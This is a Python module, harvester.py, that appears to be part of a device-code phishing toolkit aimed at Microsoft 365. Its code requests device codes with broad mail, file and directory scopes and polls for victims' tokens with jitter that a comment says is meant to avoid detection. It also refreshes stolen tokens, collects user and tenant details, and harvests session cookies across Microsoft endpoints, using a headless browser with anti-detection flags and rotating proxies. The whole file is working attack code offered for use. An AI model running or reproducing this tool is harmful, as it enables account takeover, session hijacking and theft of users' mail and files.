#!/usr/bin/env python3
# harvester.py - TokenHarvester class for device code flow and cookie extraction
# Features:
# - Device code request with retry logic
# - Token polling with exponential backoff and jitter
# - Token refresh capability
# - User info extraction from Microsoft Graph
# - Cookie harvesting from multiple Microsoft endpoints
# - Optional Playwright support for deep cookie extraction
# Updated with enhanced logger integration

import os
import time
import random
from typing import Dict, List, Optional, Callable, Any
from urllib.parse import urlparse

import requests
from core import StealthEngine, decode_jwt, validate_jwt
from logger import get_logger

# Initialize logger for this module
logger = get_logger('harvester')

# Optional Playwright for headless browser cookie extraction
try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
    logger.info("Playwright available for advanced cookie extraction")
except ImportError:
    HAS_PLAYWRIGHT = False
    logger.info("Playwright not installed - cookie extraction will use requests only")

# Optional retry library (tenacity) for robust retries
try:
    from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type
    HAS_TENACITY = True
    logger.debug("Tenacity available for advanced retry logic")
except ImportError:
    HAS_TENACITY = False
    logger.info("Tenacity not installed - using manual retries")
    
    # Manual retry decorator as fallback
    def retry_request(max_attempts=3, base_delay=1):
        def decorator(func):
            def wrapper(*args, **kwargs):
                last_error = None
                for attempt in range(max_attempts):
                    try:
                        return func(*args, **kwargs)
                    except requests.RequestException as e:
                        last_error = e
                        if attempt == max_attempts - 1:
                            raise
                        wait = base_delay * (2 ** attempt) + random.uniform(0, 1)
                        logger.warning(f"Retry {attempt+1}/{max_attempts} after error: {e}")
                        time.sleep(wait)
                raise last_error
            return wrapper
        return decorator
else:
    def retry_request(max_attempts=3, base_delay=1):
        """Retry decorator using tenacity library."""
        def decorator(func):
            retry_func = retry(
                stop=stop_after_attempt(max_attempts),
                wait=wait_exponential(multiplier=base_delay, min=1, max=10),
                retry=retry_if_exception_type(requests.RequestException)
            )(func)
            return retry_func
        return decorator


class TokenHarvester:
    """
    Main class for harvesting OAuth tokens via device code flow.
    Handles device code request, token polling, refresh, user info, and cookies.
    """
    
    # Microsoft endpoints for cookie harvesting
    ENDPOINT_POOL = [
        ("graph", "https://graph.microsoft.com/v1.0/me"),
        ("office", "https://www.office.com/"),
        ("login", "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"),
        ("myapps", "https://myapps.microsoft.com/"),
        ("outlook", "https://outlook.office365.com/owa/"),
        ("portal", "https://portal.azure.com/"),
        ("teams", "https://teams.microsoft.com/"),
        ("account", "https://account.activedirectory.windowsazure.com/"),
        ("device", "https://microsoft.com/devicelogin"),
        ("security", "https://security.microsoft.com/"),
        ("admin", "https://admin.microsoft.com/"),
        ("compliance", "https://compliance.microsoft.com/"),
        ("exchange", "https://outlook.office.com/"),
        ("sharepoint", "https://www.microsoft365.com/"),
        ("powerbi", "https://app.powerbi.com/"),
        ("dynamics", "https://home.dynamics.com/"),
    ]
    
    # Additional high-value endpoints for better cookie coverage
    HIGH_VALUE_ENDPOINTS = [
        ("onedrive", "https://onedrive.live.com/"),
        ("sharepoint_home", "https://your.sharepoint.com/"),
        ("teams_web", "https://teams.microsoft.com/"),
        ("azure_portal", "https://portal.azure.com/"),
        ("graph_explorer", "https://developer.microsoft.com/en-us/graph/graph-explorer"),
    ]

    def __init__(self, client_id: str, tenant: str = "common",
                 scopes: List[str] = None, stealth: StealthEngine = None, token_data: Dict = None,
                 client_secret: str = None):
        """
        Initialize the TokenHarvester.
        
        Args:
            client_id: Azure AD application client ID (must be public/native app)
            tenant: Azure AD tenant ("common", "organizations", or tenant ID)
            scopes: List of OAuth scopes to request
            stealth: StealthEngine instance for proxy and jitter control
            token_data: Optional pre-obtained token dict with 'access_token' key
            client_secret: Optional confidential client secret
        """
        self.client_id = client_id
        self.tenant = tenant
        self.scopes = scopes or [
            "https://graph.microsoft.com/Mail.Read",
            "https://graph.microsoft.com/Mail.Send",
            "https://graph.microsoft.com/Files.ReadWrite.All",
            "https://graph.microsoft.com/User.Read",
            "https://graph.microsoft.com/User.Read.All",
            "https://graph.microsoft.com/People.Read",
            "https://graph.microsoft.com/Calendars.Read",
            "https://graph.microsoft.com/Sites.Read.All",
            "openid", "offline_access", "profile",
        ]
        self.stealth = stealth or StealthEngine()
        self.cookies: List[Dict] = []
        self.user_info: Dict = {}
        self.token_data: Optional[Dict] = token_data
        self.client_secret = client_secret or os.environ.get('CLIENT_SECRET')
        self._seen_cookie_keys: set = set()
        self._harvest_stats = {
            'device_code_requests': 0,
            'poll_attempts': 0,
            'token_refreshes': 0,
            'user_info_fetches': 0,
            'cookie_extractions': 0,
            'playwright_uses': 0,
        }

    def get_device_code(self) -> Dict:
        """
        Request a device code from Microsoft with proxy-aware retries and exponential backoff.

        Returns:
            Dict containing 'user_code', 'device_code', 'verification_uri', 'interval'

        Raises:
            Exception: If the request fails after retries
        """
        url = f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/devicecode"
        data = {
            "client_id": self.client_id,
            "scope": " ".join(self.scopes)
        }

        max_attempts = 6
        base_delay = 1
        attempt = 0

        self._harvest_stats['device_code_requests'] += 1

        while attempt < max_attempts:
            attempt += 1
            sess = self.stealth.build_session()
            # record the proxy used for this session on the harvester
            try:
                self.stealth.jitter('device_code')
                logger.api(f"Requesting device code from {url} (attempt {attempt})")
                resp = sess.post(url, data=data, timeout=(10, 30))
                resp.raise_for_status()
                result = resp.json()
                # expose last selected proxy for observability
                self.last_used_proxy = getattr(self.stealth, '_last_selected_proxy', None)
                logger.success(f"Device code obtained: {result.get('user_code')}")
                logger.token(f"Verification URL: {result.get('verification_uri')}")
                return result
            except requests.exceptions.ProxyError as pe:
                # Proxy failures should retry with exponential backoff and rotate proxies
                self.last_used_proxy = getattr(self.stealth, '_last_selected_proxy', None)
                logger.warning(f"ProxyError on attempt {attempt}: {pe}")
                if attempt >= max_attempts:
                    raise
                wait = base_delay * (2 ** (attempt - 1)) + random.uniform(0, 1)
                logger.info(f"Backing off {wait:.1f}s before retrying (proxy rotation)")
                time.sleep(wait)
                continue
            except requests.RequestException as e:
                # For non-proxy transient errors, do a few quick retries
                logger.warning(f"RequestException on attempt {attempt}: {e}")
                if attempt < 3:
                    wait = base_delay * (2 ** (attempt - 1)) + random.uniform(0, 1)
                    logger.info(f"Transient error backoff {wait:.1f}s")
                    time.sleep(wait)
                    continue
                raise

    def poll_for_token(self, device_code: str, initial_interval: int = 5,
                       callback: Optional[Callable] = None) -> Dict:
        """
        Poll Microsoft for the token after user authenticates.
        
        Args:
            device_code: Device code from get_device_code()
            initial_interval: Initial polling interval in seconds
            callback: Optional callback function(event, data) for status updates
        
        Returns:
            Dict containing token data (access_token, refresh_token, id_token, etc.)
        
        Raises:
            RuntimeError: If polling fails or times out
        """
        url = f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/token"
        interval = initial_interval
        sess = self.stealth.build_session()
        data = {
            "client_id": self.client_id,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "device_code": device_code,
        }
        
        # Support confidential clients: add client_secret if available
        if self.client_secret:
            data['client_secret'] = self.client_secret
            logger.debug("Using confidential client flow (client_secret provided)")
        
        logger.info("Starting token polling (waiting for user authentication)...")
        poll_count = 0
        start_time = time.time()
        
        while True:
            try:
                poll_count += 1
                self._harvest_stats['poll_attempts'] += 1
                self.stealth.jitter('poll')
                
                resp = sess.post(url, data=data)
                token = resp.json()
                
                if resp.status_code == 200:
                    self.token_data = token
                    elapsed = time.time() - start_time
                    
                    if callback:
                        callback("token_obtained", token)
                    
                    logger.success(f"Token obtained successfully after {elapsed:.1f}s ({poll_count} polls)")
                    logger.token(f"Access token expires in {token.get('expires_in', 0)}s")
                    
                    # Validate token if possible
                    if token.get('id_token'):
                        if validate_jwt(token['id_token']):
                            logger.debug("ID token validation passed")
                    
                    return token
                
                error = token.get("error", "")
                error_desc = token.get("error_description", "")
                
                if error == "authorization_pending":
                    if callback:
                        callback("polling", {"interval": interval, "attempt": poll_count})
                    
                    # Add random jitter to polling interval to avoid detection
                    sleep_time = interval + random.uniform(-1, 2)
                    time.sleep(max(1, sleep_time))
                    continue
                    
                elif error == "slow_down":
                    interval += 2
                    if callback:
                        callback("slow_down", {"new_interval": interval})
                    logger.debug(f"Slow down requested, increasing interval to {interval}s")
                    time.sleep(interval + random.uniform(0, 1))
                    continue
                    
                elif error == "expired_token":
                    raise RuntimeError("Device code expired. Please restart the capture.")
                    
                else:
                    raise RuntimeError(f"Polling failed: {error} - {error_desc}")
                    
            except requests.RequestException as e:
                logger.error(f"Network error during polling: {e}, retrying after delay")
                time.sleep(interval + random.uniform(1, 3))
                
            except KeyboardInterrupt:
                logger.warning("Polling interrupted by user")
                raise

    @retry_request(max_attempts=2, base_delay=2)
    def refresh_token(self, refresh_token: str) -> Optional[Dict]:
        """
        Refresh an expired access token using the refresh token.
        
        Args:
            refresh_token: Refresh token from previous authentication
            
        Returns:
            Updated token data dict, or None if refresh failed
        """
        url = f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/token"
        sess = self.stealth.build_session()
        data = {
            "client_id": self.client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": " ".join(self.scopes),
        }
        
        # Support confidential clients: add client_secret if available
        if self.client_secret:
            data['client_secret'] = self.client_secret
            logger.debug("Using confidential client flow for refresh_token (client_secret provided)")
        
        self._harvest_stats['token_refreshes'] += 1
        
        try:
            logger.api(f"Refreshing token using refresh_token")
            resp = sess.post(url, data=data)
            
            if resp.status_code == 200:
                self.token_data = resp.json()
                logger.success("Token refreshed successfully")
                return self.token_data
            else:
                logger.warning(f"Refresh failed with status {resp.status_code}: {resp.text[:200]}")
                return None
                
        except Exception as e:
            logger.error(f"Refresh exception: {e}")
            return None

    @retry_request(max_attempts=2, base_delay=1)
    def fetch_user_info(self) -> Dict:
        """
        Fetch user information from Microsoft Graph API.
        
        Returns:
            Dict containing user info (userPrincipalName, displayName, mail, jobTitle, etc.)
        """
        if not self.token_data or not self.token_data.get('access_token'):
            logger.warning("No access token available for user info fetch")
            return {}
        
        self._harvest_stats['user_info_fetches'] += 1
        access_token = self.token_data['access_token']
        headers = {'Authorization': f'Bearer {access_token}'}
        sess = self.stealth.build_session()
        self.stealth.jitter('cookie_harvest')
        
        try:
            # Get current user profile
            logger.api("Fetching user profile from Graph API")
            resp = sess.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10)
            
            if resp.status_code == 200:
                self.user_info = resp.json()
                user_principal = self.user_info.get('userPrincipalName', 'unknown')
                logger.success(f"User info fetched: {user_principal}")
                
                # Try to get organization info (tenant ID)
                org = sess.get('https://graph.microsoft.com/v1.0/organization', headers=headers, timeout=10)
                if org.status_code == 200:
                    vals = org.json().get('value')
                    if vals:
                        self.user_info['tenantId'] = vals[0].get('id')
                        logger.debug(f"Tenant ID: {vals[0].get('id')}")
                
                # Log additional user details
                if self.user_info.get('jobTitle'):
                    logger.debug(f"Job title: {self.user_info['jobTitle']}")
                if self.user_info.get('department'):
                    logger.debug(f"Department: {self.user_info['department']}")
                    
                return self.user_info
            else:
                logger.warning(f"Failed to fetch user info: HTTP {resp.status_code}")
                return {}
                
        except Exception as e:
            logger.debug(f"fetch_user_info error: {e}")
            return {}

    def _store_cookie(self, cookie, domain_hint: str = ".microsoftonline.com"):
        """
        Store a cookie in the internal list, avoiding duplicates.
        
        Args:
            cookie: requests cookie object
            domain_hint: Default domain if cookie has no domain attribute
        """
        name = cookie.name
        domain = cookie.domain or domain_hint
        key = f"{name}@{domain}"
        
        # Skip duplicate cookies
        if key in self._seen_cookie_keys:
            return
        
        self._seen_cookie_keys.add(key)
        
        # Determine if it's a session cookie (no expiry)
        is_session = cookie.expires is None or cookie.expires == 0
        
        entry = {
            'domain': domain,
            'name': name,
            'value': cookie.value,
            'path': cookie.path or '/',
            'secure': cookie.secure,
            'httpOnly': cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
            'sameSite': 'None',
            'expirationDate': cookie.expires if cookie.expires else (int(time.time()) + 31536000) if not is_session else 0,
            'session': is_session,
        }
        self.cookies.append(entry)
        logger.cookie(f"Stored cookie: {domain} | {name} ({len(cookie.value)} chars)")

    def extract_cookies(self, max_endpoints: int = 4) -> List[Dict]:
        """
        Extract cookies by visiting Microsoft endpoints with the access token.
        
        Args:
            max_endpoints: Number of random endpoints to visit (higher = more cookies but slower)
            
        Returns:
            List of harvested cookie dicts
        """
        if not self.token_data or not self.token_data.get('access_token'):
            logger.warning("No access token available for cookie extraction")
            return []
        
        self._harvest_stats['cookie_extractions'] += 1
        access_token = self.token_data['access_token']
        
        # Try Playwright first if enabled and available
        use_playwright = os.environ.get('PLAYWRIGHT', '').lower() == 'true'
        if use_playwright and HAS_PLAYWRIGHT:
            logger.info("Extracting cookies with Playwright (headless browser mode)...")
            try:
                self._harvest_stats['playwright_uses'] += 1
                return self._extract_cookies_playwright(access_token, max_endpoints)
            except Exception as e:
                logger.warning(f"Playwright extraction failed: {e}, falling back to requests method")
        
        # Fallback to requests method
        logger.info(f"Extracting cookies with requests (visiting up to {max_endpoints} endpoints)...")
        
        # Select endpoints to visit (mix of random and high-value)
        all_endpoints = self.ENDPOINT_POOL.copy()
        random.shuffle(all_endpoints)
        chosen = all_endpoints[:max_endpoints]
        
        headers = {'Authorization': f'Bearer {access_token}'}
        start_count = len(self.cookies)
        
        for label, url in chosen:
            try:
                self.stealth.jitter('cookie_harvest')
                sess = self.stealth.build_session()
                
                logger.debug(f"Visiting {label}: {url}")
                
                if 'authorize' in url:
                    # For authorize endpoint, we need to add parameters
                    params = {
                        'client_id': self.client_id,
                        'response_type': 'code',
                        'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                        'scope': ' '.join(self.scopes),
                    }
                    resp = sess.get(url, headers=headers, params=params, allow_redirects=True, timeout=15)
                else:
                    resp = sess.get(url, headers=headers, allow_redirects=True, timeout=15)
                
                new_cookies = len(resp.cookies)
                for cookie in resp.cookies:
                    self._store_cookie(cookie)
                
                logger.cookie(f"[{label}] harvested {new_cookies} cookies (total: {len(self.cookies)})")
                
            except Exception as e:
                logger.debug(f"[{label}] skipped: {e}")
        
        # Additional endpoint: microsoft.com/devicelogin (often has useful cookies)
        try:
            self.stealth.jitter('cookie_harvest')
            fresh = self.stealth.build_session()
            dr = fresh.get('https://microsoft.com/devicelogin', allow_redirects=True, timeout=10)
            for cookie in dr.cookies:
                self._store_cookie(cookie, ".microsoft.com")
            logger.cookie(f"devicelogin harvested {len(dr.cookies)} additional cookies")
        except Exception as e:
            logger.debug(f"devicelogin skipped: {e}")
        
        new_total = len(self.cookies) - start_count
        logger.success(f"Extracted {new_total} new cookies (total unique: {len(self.cookies)})")
        return self.cookies

    def _extract_cookies_playwright(self, access_token: str, max_endpoints: int) -> List[Dict]:
        """
        Extract cookies using Playwright headless browser.
        This method captures more cookies including HttpOnly and secure cookies.
        
        Args:
            access_token: OAuth access token to authenticate
            max_endpoints: Number of endpoints to visit
            
        Returns:
            List of harvested cookie dicts
        """
        from playwright.sync_api import sync_playwright
        
        start_count = len(self.cookies)
        logger.info(f"Launching Playwright browser for cookie extraction")
        
        with sync_playwright() as p:
            # Launch headless Chromium with stealth arguments
            browser = p.chromium.launch(
                headless=True,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                ]
            )
            
            # Create context with realistic viewport
            context = browser.new_context(
                viewport={'width': random.choice([1366, 1440, 1536, 1920]), 
                         'height': random.choice([768, 900, 1080])},
                user_agent=self.stealth.random_ua()
            )
            page = context.new_page()
            
            # Set authorization header for all requests
            page.set_extra_http_headers({'Authorization': f'Bearer {access_token}'})
            
            # Select endpoints to visit
            endpoints = [url for _, url in random.sample(self.ENDPOINT_POOL, min(max_endpoints, len(self.ENDPOINT_POOL)))]
            
            for url in endpoints:
                try:
                    logger.debug(f"Playwright navigating to: {urlparse(url).netloc}")
                    page.goto(url, wait_until='networkidle', timeout=15000)
                    # Random wait to mimic human behavior
                    time.sleep(random.uniform(1, 3))
                except Exception as e:
                    logger.debug(f"Playwright navigation to {url} failed: {e}")
            
            # Get all cookies from the browser context
            cookies = context.cookies()
            browser.close()
            
            # Convert to our internal format
            for c in cookies:
                entry = {
                    'domain': c.get('domain', '.microsoftonline.com'),
                    'name': c.get('name'),
                    'value': c.get('value'),
                    'path': c.get('path', '/'),
                    'secure': c.get('secure', False),
                    'httpOnly': c.get('httpOnly', False),
                    'sameSite': c.get('sameSite', 'None'),
                    'expirationDate': c.get('expires', int(time.time()) + 31536000),
                    'session': c.get('expires', 0) == 0,
                }
                # Avoid duplicates
                key = f"{entry['name']}@{entry['domain']}"
                if key not in self._seen_cookie_keys:
                    self._seen_cookie_keys.add(key)
                    self.cookies.append(entry)
            
            new_total = len(self.cookies) - start_count
            logger.success(f"Playwright extracted {new_total} new cookies (total unique: {len(self.cookies)})")
            return self.cookies

    def get_stats(self) -> Dict:
        """
        Get harvest statistics.
        
        Returns:
            Dict containing harvest statistics
        """
        return {
            **self._harvest_stats,
            'unique_cookies': len(self.cookies),
            'has_token': self.token_data is not None,
            'user_fetched': bool(self.user_info),
            'scopes_requested': len(self.scopes),
        }
    
    def reset(self):
        """
        Reset the harvester state for a new capture.
        """
        self.cookies = []
        self.user_info = {}
        self.token_data = None
        self._seen_cookie_keys = set()
        logger.info("Harvester state reset")

# -------------------- HELPER FUNCTIONS --------------------
def create_harvester_from_env() -> Optional[TokenHarvester]:
    """
    Create a TokenHarvester instance from environment variables.
    
    Returns:
        TokenHarvester instance or None if CLIENT_ID not set
    """
    client_id = os.environ.get('CLIENT_ID')
    if not client_id:
        logger.error("CLIENT_ID environment variable not set")
        return None
    
    tenant = os.environ.get('TENANT', 'common')
    stealth = StealthEngine()
    
    # Parse scopes from environment if provided
    scope_str = os.environ.get('SCOPES', '')
    scopes = scope_str.split() if scope_str else None
    
    logger.info(f"Creating harvester for tenant: {tenant}")
    return TokenHarvester(client_id=client_id, tenant=tenant, scopes=scopes, stealth=stealth)